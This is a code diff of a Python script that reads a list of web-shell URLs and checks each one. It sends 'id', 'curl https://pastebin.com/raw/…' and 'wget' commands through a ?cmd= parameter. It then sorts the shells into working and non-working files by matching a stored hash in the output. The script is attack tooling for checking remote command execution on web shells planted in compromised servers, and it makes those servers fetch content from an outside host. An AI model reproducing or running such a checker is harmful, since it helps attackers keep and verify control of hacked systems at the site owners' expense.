@@ -2,12 +2,20 @@ import argparse
 import sys
 
 import requests
-import csv
+import pandas
 
 ascii_purple_color = "\x1b[38;5;13m"
 ascii_green_color = "\x1b[32m"
 ascii_red_color = "\x1b[1;31m"
 reset_ascii_color = "\u001B[0m"
+
+cmd_id = "id"
+cmd_curl = "curl https://pastebin.com/raw/NYE0HT2k"
+# this command checks could file be downloaded and redirects output to stdout without saving it
+cmd_wget = "wget https://pastebin.com/raw/NYE0HT2k --output-document - | head -n1"
+secret_message = "$2a$15$WNSlyUYj7TlpIXo.QAo/y.MTsitEwhm00gIIgHTJuc.GANQW9tgSC"
+file_with_working_shells = "working.txt"
+file_with_not_working_shells = "not_working.txt"
 
 
 def parse_arguments():
@@ -18,45 +26,57 @@ def parse_arguments():
     if len(sys.argv) == 0 or args.l == '' or args is None:
         parser.print_help()
         sys.exit(1)
-    else:
-        check_status(args.l)
+    if args.l.endswith('.txt'):
+        check_status_txt_file(args.l)
+    if args.l.endswith('.csv'):
+        check_status_csv_file(args.l)
 
 
-def check_status(path):
-    cmd_id = "id"
-    cmd_curl = "curl https://pastebin.com/raw/NYE0HT2k"
-    # this command checks could file be downloaded and redirects output to stdout without saving it
-    cmd_wget = "wget https://pastebin.com/raw/NYE0HT2k --output-document - | head -n1"
-    secret_message = "$2a$15$WNSlyUYj7TlpIXo.QAo/y.MTsitEwhm00gIIgHTJuc.GANQW9tgSC"
-    file_with_working_shells = "working.txt"
-    file_with_not_working_shells = "not_working.txt"
-    with (open(path) as file):
-        with open(file_with_working_shells, 'w') as working_shells_file:
-            with open(file_with_not_working_shells, 'w') as not_working_shells_file:
-                for line in file:
-                    response_text_id = requests.get(line + f"?cmd={cmd_id}").text
-                    response_text_curl = requests.get(line + f"?cmd={cmd_curl}").text
-                    response_text_wget = requests.get(line + f"?cmd={cmd_wget}").text
+def check_status_txt_file(path):
+    with (open(path) as txt_file):
+        for line in txt_file:
+            send_requests_and_compare_responses(line)
+    txt_file.close()
 
-                    contains_uid = response_text_id.find("uid")
-                    contains_wget_file = secret_message in response_text_wget
-                    contains_curl_file = secret_message in response_text_curl
-                    if contains_uid != -1 & contains_curl_file & contains_wget_file:
 
-                        response_status = requests.get(line + "?cmd=id").status_code
-                        print(ascii_green_color + "Shell " + line + " is alive." + "\n" +
-                              "Status code: " + str(response_status))
-                        print("All necessary commands works." + reset_ascii_color)
+def check_status_csv_file(path):
+    with (open(path, newline='') as csv_file):
+        results = pandas.read_csv(csv_file, usecols=['url'])
+        row_count = len(results)
+        for index in range(row_count):
+            line = results.__array__().item(index)
+            send_requests_and_compare_responses(line)
+    csv_file.close()
 
-                        working_shells_file.write(line + "\n")
-                    elif contains_uid != -1 | contains_curl_file | contains_wget_file:
-                        print(ascii_red_color + "Probably not all commands working" + reset_ascii_color)
-                        not_working_shells_file.write(line + "\n")
-                    else:
-                        print("Shell did not respond: " + line + "\n" +
-                              "Check path to shell ")
-                        not_working_shells_file.write(line + "\n")
-    file.close()
+
+def send_requests_and_compare_responses(shell_url):
+    with open(file_with_working_shells, 'w') as working_shells_file:
+        with open(file_with_not_working_shells, 'w') as not_working_shells_file:
+            print(ascii_green_color + "Checking shell: " + shell_url + reset_ascii_color)
+
+            response_text_id = requests.get(shell_url + f"?cmd={cmd_id}", timeout=7000).text
+            response_text_curl = requests.get(shell_url + f"?cmd={cmd_curl}", timeout=7000).text
+            response_text_wget = requests.get(shell_url + f"?cmd={cmd_wget}", timeout=7000).text
+
+            contains_uid = response_text_id.find("uid")
+            contains_wget_file = secret_message in response_text_wget
+            contains_curl_file = secret_message in response_text_curl
+            if contains_uid != -1 and contains_curl_file and contains_wget_file:
+
+                response_status = requests.get(shell_url + "?cmd=id").status_code
+                print(ascii_green_color + "Shell " + shell_url + " is alive." + "\n" +
+                      "Status code: " + str(response_status))
+                print("All necessary commands works." + reset_ascii_color)
+
+                working_shells_file.write(shell_url + "\n")
+            elif contains_uid != -1 or contains_curl_file or contains_wget_file:
+                print(ascii_red_color + "Probably not all commands working" + reset_ascii_color)
+                not_working_shells_file.write(shell_url + "\n")
+            else:
+                print(ascii_red_color + "Shell did not respond: " + shell_url + "\n" +
+                      "Check path to shell " + reset_ascii_color)
+                not_working_shells_file.write(shell_url + "\n")
+
     not_working_shells_file.close()
     working_shells_file.close()
 
